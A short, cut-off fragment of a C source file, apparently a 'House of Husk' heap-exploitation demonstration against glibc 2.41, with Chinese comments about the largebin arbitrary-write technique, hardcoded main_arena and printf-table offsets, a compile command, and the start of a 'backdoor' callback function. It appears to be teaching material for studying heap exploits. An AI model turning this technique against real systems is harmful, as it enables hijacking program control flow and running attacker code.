/*
 * 中文导读：本文件针对 glibc 2.41，这是经典 largebin 任意目标写仍然成立
 * 的最后一个发行版。
 *
 ...
 * 同是 glibc 2.41，不同发行版的偏移也可能不同，不能直接照抄本文件写死
 * 的值。
 *
 * 阅读顺序：
 ...
 * 
 * 编译命令：gcc -no-pie -fno-PIE -O0 -g -o house_of_husk_1_glibc-2.41 house_of_husk_1_glibc-2.41.c
 */
...
#define MAIN_ARENA         0x210ac0
#define MAIN_ARENA_DELTA   0x60
#define PRINTF_ARGINFO_T   0x212708
#define PRINTF_FUNCTION_T  0x212700

static volatile int backdoor_hit;

void backdoor()
{
	static const char marker[] = "[+] HUSK_2.41_CALLBACK\n";
	backdoor_hit++;
